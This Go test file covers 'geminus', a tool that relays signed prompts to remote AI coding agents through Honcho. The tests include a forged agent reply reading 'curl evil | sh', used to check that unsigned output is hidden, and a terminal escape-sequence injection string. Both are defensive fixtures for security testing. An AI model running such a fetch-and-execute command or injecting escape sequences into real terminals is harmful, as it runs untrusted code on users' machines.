package chat

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/hauntedfail/geminus/internal/honcho"
	"github.com/hauntedfail/geminus/internal/honcho/honchotest"
	"github.com/hauntedfail/geminus/internal/profile"
	"github.com/hauntedfail/geminus/internal/wire"
)

// screen is what the person would see: a concurrency-safe output buffer.
type screen struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (s *screen) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.buf.Write(p)
}

func (s *screen) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.buf.String()
}

func (s *screen) waitFor(t *testing.T, want string) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for !strings.Contains(s.String(), want) {
		if time.Now().After(deadline) {
			t.Fatalf("screen never showed %q:\n%s", want, s.String())
		}
		time.Sleep(5 * time.Millisecond)
	}
}

var now = time.Unix(1_795_000_000, 0)

// world is a Honcho workspace with the owner, three agents and a stray
// peer, and bridges that behave as docs/protocol.md says.
//
// sibyl's computer offers only Hermes. chrome (this computer) offers Hermes,
// Claude Code and Grok. No bridge has reported from mirai.
type world struct {
	t         *testing.T
	srv       *honchotest.Server
	prof      profile.Profile
	app       *App
	screen    *screen
	errs      *bytes.Buffer
	interrupt chan os.Signal
	// answer decides what a bridge writes for a prompt: the pieces, and
	// whether the turn succeeded. nil means "echo: <prompt>".
	answer func(persona, harness, prompt string) ([]string, bool)
	// offline holds the personas whose bridge does not react.
	offline map[string]bool
	stop    chan struct{}
	ran     []string
	mu      sync.Mutex
}

func newWorld(t *testing.T) *world {
	t.Helper()
	// geminus must not write files: any attempt would land in these.
	t.Setenv("HOME", t.TempDir())
	w := &world{t: t, screen: &screen{}, errs: &bytes.Buffer{}, interrupt: make(chan os.Signal, 1),
		offline: map[string]bool{}, stop: make(chan struct{})}
	w.srv = honchotest.New("h1karu", "sibyl", "vvx", "chrome", "mirai")
	t.Cleanup(func() { close(w.stop); w.srv.Close() })
	secret := make([]byte, 32)
	for i := range secret {
		secret[i] = byte(i)
	}
	w.prof = profile.Profile{BaseURL: w.srv.URL, Workspace: w.srv.Workspace, APIKey: w.srv.Key,
		Human: "h1karu", Local: "chrome", Secret: secret,
		Members: map[string]string{"h1karu": "human", "chrome": "agent", "sibyl": "agent", "mirai": "agent"}}
	w.card("sibyl", now.Add(-40*time.Second), "hermes")
	w.card("chrome", now.Add(-5*time.Second), "hermes", "claude", "grok")
	w.newApp()
	for _, persona := range []string{"sibyl", "chrome", "mirai"} {
		go w.bridge(persona)
	}
	return w
}

var names = map[string]string{"hermes": "Hermes Agent", "claude": "Claude Code", "grok": "Grok", "codex": "Codex"}

func (w *world) card(peer string, seen time.Time, ids ...string) {
	card := wire.NodeCard{V: 1, TS: seen.Unix()}
	for _, id := range ids {
		card.Harnesses = append(card.Harnesses, wire.Harness{ID: id, Name: names[id]})
	}
	card.Sig = wire.Sign(w.prof.Secret, strings.Join(ids, ","), wire.NodeLabel(peer), card.TS)
	w.srv.SetPeerMetadata(peer, wire.NodeKey, card)
}

func (w *world) newApp() {
	client, err := honcho.New(w.prof.BaseURL, w.prof.Workspace, w.prof.APIKey)
	if err != nil {
		w.t.Fatal(err)
	}
	w.screen, w.errs = &screen{}, &bytes.Buffer{}
	w.app = &App{Out: NewPrinter(w.screen), Profile: w.prof, Honcho: client, Now: func() time.Time { return now },
		Watch: 5 * time.Millisecond, Idle: 10 * time.Millisecond, SlowAfter: time.Hour,
		ctx: context.Background(), interrupt: w.interrupt}
}

func asMap(v any) map[string]any {
	data, _ := json.Marshal(v)
	var out map[string]any
	_ = json.Unmarshal(data, &out)
	return out
}

// bridge plays the part of the geminish bridge on one persona's computer.
func (w *world) bridge(persona string) {
	for {
		select {
		case <-w.stop:
			return
		case <-time.After(3 * time.Millisecond):
		}
		w.mu.Lock()
		off := w.offline[persona]
		w.mu.Unlock()
		if off {
			continue
		}
		for _, s := range w.srv.Sessions() {
			info := asMap(s.Metadata[wire.Kind])
			if s.Metadata["kind"] != wire.Kind || info["persona"] != persona || info["pending"] != true {
				continue
			}
			info["pending"] = false
			w.srv.SetMetadata(s.ID, "", map[string]any{"kind": wire.Kind, wire.Kind: info})
			for _, m := range w.srv.Messages(s.ID) {
				var meta wire.Message
				raw, _ := json.Marshal(m.Metadata[wire.Kind])
				if json.Unmarshal(raw, &meta) != nil || meta.Role != wire.RolePrompt || meta.State != wire.StateQueued {
					continue
				}
				harness, _ := info["harness"].(string)
				label := wire.PromptLabel(s.ID, persona, harness, m.PeerID, meta.Nonce)
				state := func(v, detail string) {
					meta.State, meta.Detail = v, detail
					w.srv.SetMetadata(s.ID, m.ID, map[string]any{wire.Kind: meta})
				}
				if m.PeerID != "h1karu" || !wire.Verify(w.prof.Secret, m.Content, label, meta.TS, meta.Sig) {
					state(wire.StateRefused, "the signature does not verify")
					continue
				}
				state(wire.StateRunning, "")
				w.mu.Lock()
				w.ran = append(w.ran, persona+"/"+harness+": "+m.Content)
				answer := w.answer
				w.mu.Unlock()
				pieces, ok := []string{"echo: " + m.Content}, true
				if answer != nil {
					pieces, ok = answer(persona, harness, m.Content)
				}
				for i, piece := range pieces {
					final := i == len(pieces)-1
					out := wire.Message{V: 1, Role: wire.RoleOutput, Turn: m.ID, Seq: i + 1, Final: final, OK: ok || !final,
						Native: "native-1", TS: now.Unix()}
					out.Sig = wire.Sign(w.prof.Secret, piece, wire.OutputLabel(s.ID, m.ID, out.Seq, out.Final, out.OK), out.TS)
					w.srv.Append(s.ID, persona, piece, map[string]any{wire.Kind: out})
				}
				if ok {
					state(wire.StateDone, "")
				} else {
					state(wire.StateFailed, pieces[len(pieces)-1])
				}
			}
		}
	}
}

// run feeds the lines as typed input and returns the exit code.
func (w *world) run(args []string, lines ...string) int {
	w.t.Helper()
	input := strings.Join(lines, "\n")
	if len(lines) > 0 {
		input += "\n"
	}
	return w.app.Main(args, strings.NewReader(input), w.errs)
}

// talk types lines one at a time, waiting for each expected text, so that an
// answer has arrived before the next line is typed.
func (w *world) talk(args []string, steps ...[2]string) {
	w.t.Helper()
	in, typist := io.Pipe()
	done := make(chan int, 1)
	go func() { done <- w.app.Main(args, in, w.errs) }()
	for _, step := range steps {
		io.WriteString(typist, step[0]+"\n")
		if step[1] != "" {
			w.screen.waitFor(w.t, step[1])
		}
	}
	typist.Close()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		w.t.Fatalf("geminus did not exit:\n%s", w.screen.String())
	}
}

func (w *world) expect(wants ...string) {
	w.t.Helper()
	got := w.screen.String()
	for _, want := range wants {
		if !strings.Contains(got, want) {
			w.t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
}

func (w *world) expectNot(unwanted ...string) {
	w.t.Helper()
	got := w.screen.String()
	for _, s := range unwanted {
		if strings.Contains(got, s) {
			w.t.Errorf("screen shows %q:\n%s", s, got)
		}
	}
}

func (w *world) defaults() wire.Defaults {
	var d wire.Defaults
	_ = json.Unmarshal(w.srv.PeerMetadata("h1karu", wire.DefaultsKey), &d)
	return d
}

func TestPersonaListComesFromHonchoWithWhatEachComputerOffers(t *testing.T) {
	w := newWorld(t)
	if code := w.run([]string{"persona"}); code != 0 {
		t.Fatalf("exit %d: %s", code, w.errs)
	}
	w.expect(
		"Personas (Honcho workspace ws)",
		"1  chrome  THIS COMPUTER  hermes claude grok  (bridge seen 5s ago)",
		"2  mirai   REMOTE         no bridge has reported from this computer",
		"3  sibyl   REMOTE         hermes  (bridge seen 40s ago)",
	)
	// The owner and the stray peer are not personas.
	w.expectNot("h1karu", "vvx")
}

func TestBareStartPicksAPersonaAndThePromptGoesThroughHonchoVerbatim(t *testing.T) {
	w := newWorld(t)
	prompt := "  fix the bug, don't touch tests  "
	w.talk(nil, [2]string{"nobody", "no persona \"nobody\" here"}, [2]string{"sibyl", "● sibyl [REMOTE]"},
		[2]string{prompt, "echo: fix the bug"})
	w.expect(
		"persona ❯ nobody",
		"● sibyl [REMOTE]  Hermes Agent  bridge seen 40s ago  new conversation",
		"sibyl [REMOTE] · hermes ❯ "+prompt,
		"recorded in Honcho for sibyl",
		"echo: fix the bug, don't touch tests",
	)
	// sibyl offers one harness, so there is nothing to ask.
	w.expectNot("harness ❯")

	sessions := w.srv.Sessions()
	if len(sessions) != 1 || !strings.HasPrefix(sessions[0].ID, "geminus-sibyl-"+now.Format("20060102")+"-") {
		t.Fatalf("sessions = %+v", sessions)
	}
	info := asMap(sessions[0].Metadata[wire.Kind])
	if sessions[0].Metadata["kind"] != "geminus" || info["human"] != "h1karu" || info["persona"] != "sibyl" || info["harness"] != "hermes" {
		t.Errorf("session metadata = %v", sessions[0].Metadata)
	}
	first := w.srv.Messages(sessions[0].ID)[0]
	// The message is the prompt and nothing else: no preamble, no envelope.
	if first.PeerID != "h1karu" || first.Content != strings.TrimSpace(prompt) {
		t.Errorf("stored prompt = %q by %s", first.Content, first.PeerID)
	}
	if _, isMail := first.Metadata["geminise"]; isMail {
		t.Error("a geminus prompt carries geminise mail metadata")
	}
}

func TestDefaultsFromHonchoStartWithoutAsking(t *testing.T) {
	w := newWorld(t)
	w.srv.SetPeerMetadata("h1karu", wire.DefaultsKey, wire.Defaults{V: 1, Persona: "chrome",
		Personas: map[string]wire.PersonaDefaults{"chrome": {Harness: "claude", CWD: "/work/project"}}})
	w.talk(nil, [2]string{"hi", "echo: hi"})
	w.expect("● chrome [THIS COMPUTER]  Claude Code  bridge seen 5s ago  new conversation  in /work/project",
		"chrome [THIS COMPUTER] · claude ❯ hi")
	w.expectNot("persona ❯", "harness ❯")
	info := asMap(w.srv.Sessions()[0].Metadata[wire.Kind])
	if info["harness"] != "claude" || info["cwd"] != "/work/project" {
		t.Errorf("session metadata = %v", info)
	}
}

func TestHarnessChoicesAreWhatThatComputerReported(t *testing.T) {
	w := newWorld(t)
	w.talk([]string{"persona", "chrome"}, [2]string{"codex", `no harness "codex" here`}, [2]string{"gr", "● chrome"},
		[2]string{"which?", "echo: which?"})
	w.expect(
		"Harnesses on chrome [THIS COMPUTER] right now",
		"  1  hermes  Hermes Agent", "  2  claude  Claude Code", "  3  grok    Grok",
		"chrome [THIS COMPUTER] · grok ❯ which?",
	)
	w.expectNot("Codex", "  4  ")
	if w.ran[0] != "chrome/grok: which?" {
		t.Errorf("ran = %v", w.ran)
	}
}

func TestHarnessFlagAndWhatIsNotThere(t *testing.T) {
	w := newWorld(t)
	w.talk([]string{"persona", "chrome", "--harness", "claude", "--cwd", "/src"}, [2]string{"hi", "echo: hi"})
	w.expect("● chrome [THIS COMPUTER]  Claude Code", "in /src")

	w = newWorld(t)
	if code := w.run([]string{"persona", "sibyl", "--harness", "claude"}); code != 1 || !strings.Contains(w.errs.String(), `sibyl's computer has no harness "claude" (it has: hermes)`) {
		t.Errorf("exit %d, stderr %q", code, w.errs)
	}
	w = newWorld(t)
	if code := w.run([]string{"persona", "mirai"}); code != 1 || !strings.Contains(w.errs.String(), "no bridge has reported from mirai's computer") {
		t.Errorf("exit %d, stderr %q", code, w.errs)
	}
	if len(w.srv.Sessions()) != 0 {
		t.Error("something was written although nothing can be reached")
	}
}

func TestUnknownPersonaAndBadUsage(t *testing.T) {
	w := newWorld(t)
	if code := w.run([]string{"persona", "nobody"}); code != 1 || !strings.Contains(w.errs.String(), `no persona named "nobody"`) {
		t.Errorf("exit %d, stderr %q", code, w.errs)
	}
	for _, args := range [][]string{{"run"}, {"persona", "sibyl", "--bogus"}, {"persona", "--continue"}, {"--harness"},
		{"persona", "sibyl", "--continue", "--resume", "x"}, {"sibyl"}} {
		if code := newWorld(t).run(args); code != 2 {
			t.Errorf("%v: exit %d, want 2", args, code)
		}
	}
}

func TestDefaultsAreSavedInHonchoAndUsedByTheNextStart(t *testing.T) {
	w := newWorld(t)
	w.talk([]string{"persona", "chrome", "--harness", "grok"},
		[2]string{"/default", "persona  (none)"},
		[2]string{"/new /work/api", "in /work/api"},
		[2]string{"/default save", "geminus now starts with chrome [THIS COMPUTER] · Grok (saved in Honcho)"},
		[2]string{"/default persona nobody", `no persona named "nobody"`},
		[2]string{"/default harness", "usage: /default harness VALUE"},
		[2]string{"/default", "on chrome  harness grok  cwd /work/api"})
	want := wire.Defaults{V: 1, Persona: "chrome", Personas: map[string]wire.PersonaDefaults{"chrome": {Harness: "grok", CWD: "/work/api"}}}
	got := w.defaults()
	if got.Persona != want.Persona || got.Personas["chrome"] != want.Personas["chrome"] {
		t.Errorf("defaults in Honcho = %+v", got)
	}
	// The node card sits in other peers' metadata and must be untouched.
	if len(w.srv.PeerMetadata("chrome", wire.NodeKey)) < 10 {
		t.Error("saving defaults damaged another peer's metadata")
	}

	w.newApp()
	w.talk(nil, [2]string{"again", "echo: again"})
	w.expect("chrome [THIS COMPUTER] · grok ❯ again", "in /work/api")
	w.expectNot("persona ❯")

	w.newApp()
	w.talk(nil, [2]string{"/default harness none", "default harness: (none)"}, [2]string{"/default cwd none", "default cwd: (none)"},
		[2]string{"/default persona none", "default persona: (none)"})
	if got := w.defaults(); got.Persona != "" || len(got.Personas) != 0 {
		t.Errorf("defaults after clearing = %+v", got)
	}
}

func TestAnswersAreAsynchronous(t *testing.T) {
	w := newWorld(t)
	w.mu.Lock()
	w.offline["sibyl"] = true
	w.mu.Unlock()
	w.app.SlowAfter = 20 * time.Millisecond
	started := time.Now()
	w.app.Now = func() time.Time { return now.Add(time.Since(started)) }
	in, typist := io.Pipe()
	done := make(chan int, 1)
	go func() { done <- w.app.Main([]string{"persona", "sibyl"}, in, w.errs) }()

	io.WriteString(typist, "long job\n")
	// Nobody picks it up: geminus says so instead of pretending.
	w.screen.waitFor(t, "sibyl has not picked it up yet (bridge seen 40s ago)")
	// Ctrl-C stops watching, not the job.
	w.interrupt <- os.Interrupt
	w.screen.waitFor(t, "not watching any more")
	io.WriteString(typist, "/status\n")
	w.screen.waitFor(t, "conversation geminus-sibyl-")

	// The bridge comes back; the answer shows up at the prompt on its own.
	w.mu.Lock()
	w.offline["sibyl"] = false
	w.mu.Unlock()
	w.screen.waitFor(t, "echo: long job")
	typist.Close()
	<-done
	if n := strings.Count(w.screen.String(), "echo: long job"); n != 1 {
		t.Errorf("the answer was shown %d times", n)
	}
}

func TestSessionsResumeAndContinue(t *testing.T) {
	w := newWorld(t)
	// Time passes between prompts, so "the latest" is well defined.
	var clock sync.Mutex
	ticks := 0
	w.app.Now = func() time.Time {
		clock.Lock()
		defer clock.Unlock()
		ticks++
		return now.Add(time.Duration(ticks) * time.Second)
	}
	w.talk([]string{"persona", "chrome", "--harness", "hermes"},
		[2]string{"first topic", "echo: first topic"},
		[2]string{"/harness claude", "● chrome [THIS COMPUTER]  Claude Code"},
		[2]string{"second topic", "echo: second topic"},
		[2]string{"/sessions", "  2  "},
		[2]string{"/resume 2", "── end of history ──"},
		[2]string{"more on the first", "echo: more on the first"},
		[2]string{"/resume zzz", `no conversation "zzz"`})
	sessions := w.srv.Sessions()
	if len(sessions) != 2 {
		t.Fatalf("%d conversations, want 2 (one per harness)", len(sessions))
	}
	w.expect(
		"claude    second topic", "hermes    first topic",
		"── conversation so far ──", "you: first topic",
		// A reopened conversation keeps the harness it was started with.
		"chrome [THIS COMPUTER] · hermes ❯ more on the first",
	)
	if got := len(w.srv.Messages(sessions[0].ID)); got != 4 {
		t.Errorf("the first conversation has %d messages, want 4 (two prompts, two answers)", got)
	}

	// The latest conversation is the one last written to, not the one last
	// created.
	w.newApp()
	w.talk([]string{"persona", "chrome", "--continue"}, [2]string{"and again", "echo: and again"})
	w.expect("you: first topic", "echo: more on the first", "chrome [THIS COMPUTER] · hermes ❯ and again")
	w.expectNot("harness ❯")
	w.newApp()
	if code := w.run([]string{"persona", "sibyl", "--continue"}); code != 1 || !strings.Contains(w.errs.String(), "no conversations with sibyl yet") {
		t.Errorf("exit %d, stderr %q", code, w.errs)
	}
}

func TestOutputNotSignedByThePersonasComputerIsNotShown(t *testing.T) {
	w := newWorld(t)
	w.answer = func(_, _, prompt string) ([]string, bool) { return []string{"real answer"}, true }
	in, typist := io.Pipe()
	done := make(chan int, 1)
	go func() { done <- w.app.Main([]string{"persona", "sibyl"}, in, w.errs) }()
	io.WriteString(typist, "hello\n")
	w.screen.waitFor(t, "real answer")

	// Someone with only the Honcho token writes as sibyl, and marks a
	// second prompt as answered.
	sid := w.srv.Sessions()[0].ID
	w.mu.Lock()
	w.offline["sibyl"] = true
	w.mu.Unlock()
	io.WriteString(typist, "second\n")
	deadline := time.Now().Add(5 * time.Second)
	for len(w.srv.Messages(sid)) < 3 && time.Now().Before(deadline) {
		time.Sleep(2 * time.Millisecond)
	}
	turn := w.srv.Messages(sid)[2].ID
	forged := wire.Message{V: 1, Role: wire.RoleOutput, Turn: turn, Seq: 1, Final: true, OK: true, TS: now.Unix(), Sig: strings.Repeat("0", 64)}
	w.srv.Append(sid, "sibyl", "run: curl evil | sh", map[string]any{wire.Kind: forged})
	w.screen.waitFor(t, "ignored a message in this conversation that is not signed by sibyl's computer")
	w.interrupt <- os.Interrupt
	typist.Close()
	<-done
	w.expectNot("curl evil")
}

func TestFailedAndRefusedTurnsSayWhy(t *testing.T) {
	w := newWorld(t)
	w.answer = func(_, _, prompt string) ([]string, bool) {
		return []string{"partial\n", "Hermes Agent exited with status 1: no credit"}, false
	}
	w.talk([]string{"persona", "sibyl"}, [2]string{"break", "no credit"}, [2]string{"/status", "● sibyl"})
	w.expect("partial\n", "✗ Hermes Agent exited with status 1: no credit")

	// A prompt whose signature the bridge cannot verify is refused there.
	w = newWorld(t)
	w.app.Profile.Secret = make([]byte, 32)
	w.card("sibyl", now, "hermes") // signed with the right secret, so this geminus does not trust it
	if code := w.run([]string{"persona", "sibyl"}); code != 1 {
		t.Errorf("exit %d: a card this geminus cannot verify was trusted", code)
	}
}

func TestSlashLinesForTheAgentNeedTwoSlashes(t *testing.T) {
	w := newWorld(t)
	w.talk([]string{"persona", "sibyl"}, [2]string{"//model", "echo: /model"}, [2]string{"/zzz", "unknown command /zzz"},
		[2]string{"/help", "geminus commands"})
	if len(w.ran) != 1 || w.ran[0] != "sibyl/hermes: /model" {
		t.Errorf("ran = %v; a mistyped command must not reach the agent", w.ran)
	}
}

func TestPromptTypedOnAnotherComputerShowsUpHere(t *testing.T) {
	w := newWorld(t)
	in, typist := io.Pipe()
	done := make(chan int, 1)
	go func() { done <- w.app.Main([]string{"persona", "sibyl"}, in, w.errs) }()
	io.WriteString(typist, "from chrome\n")
	w.screen.waitFor(t, "echo: from chrome")

	// The same conversation, written by geminus on another computer.
	sid := w.srv.Sessions()[0].ID
	info := asMap(w.srv.Sessions()[0].Metadata[wire.Kind])
	meta := wire.Message{V: 1, Role: wire.RolePrompt, Nonce: "n2", TS: now.Unix(), State: wire.StateQueued}
	meta.Sig = wire.Sign(w.prof.Secret, "from mirai", wire.PromptLabel(sid, "sibyl", "hermes", "h1karu", "n2"), meta.TS)
	w.srv.Append(sid, "h1karu", "from mirai", map[string]any{wire.Kind: meta})
	info["pending"] = true
	w.srv.SetMetadata(sid, "", map[string]any{"kind": wire.Kind, wire.Kind: info})
	// Nothing is waiting here, so it is seen at the next thing typed.
	io.WriteString(typist, "next\n")
	w.screen.waitFor(t, "echo: next")
	typist.Close()
	<-done
	w.expect("you, from another geminus: from mirai", "echo: from mirai")
}

func TestNothingFromOutsideCanControlTheTerminal(t *testing.T) {
	const esc = "\x1b[2J\x1b]0;owned\x07"
	w := newWorld(t)
	w.answer = func(_, _, prompt string) ([]string, bool) { return []string{"out" + esc + "put"}, true }
	w.srv.SetPeerMetadata("h1karu", wire.DefaultsKey, wire.Defaults{V: 1, Personas: map[string]wire.PersonaDefaults{"sibyl": {CWD: "/x" + esc}}})
	w.talk([]string{"persona", "sibyl"}, [2]string{"hi", "put\n"}, [2]string{"/sessions", "●  1"}, [2]string{"/default", "defaults"},
		[2]string{"/resume", "end of history"})
	for _, line := range strings.Split(w.screen.String(), "\n") {
		if strings.ContainsAny(line, "\x1b\x07") {
			t.Errorf("escape sequence reached the screen: %q", line)
		}
	}
}

func TestGeminusKeepsNoFiles(t *testing.T) {
	w := newWorld(t)
	home := os.Getenv("HOME")
	w.talk([]string{"persona", "sibyl"}, [2]string{"hi", "echo: hi"}, [2]string{"/default save", "saved in Honcho"})
	entries, err := os.ReadDir(home)
	if err != nil || len(entries) != 0 {
		t.Errorf("files appeared in the home directory: %v %v", entries, err)
	}
}

func TestVersionAndHelp(t *testing.T) {
	w := newWorld(t)
	if code := w.run([]string{"version"}); code != 0 || !strings.Contains(w.screen.String(), "geminus ") {
		t.Errorf("version: exit %d, %q", code, w.screen.String())
	}
	w = newWorld(t)
	if code := w.run([]string{"help"}); code != 0 || !strings.Contains(w.screen.String(), "geminus persona NAME") {
		t.Errorf("help: exit %d, %q", code, w.screen.String())
	}
}
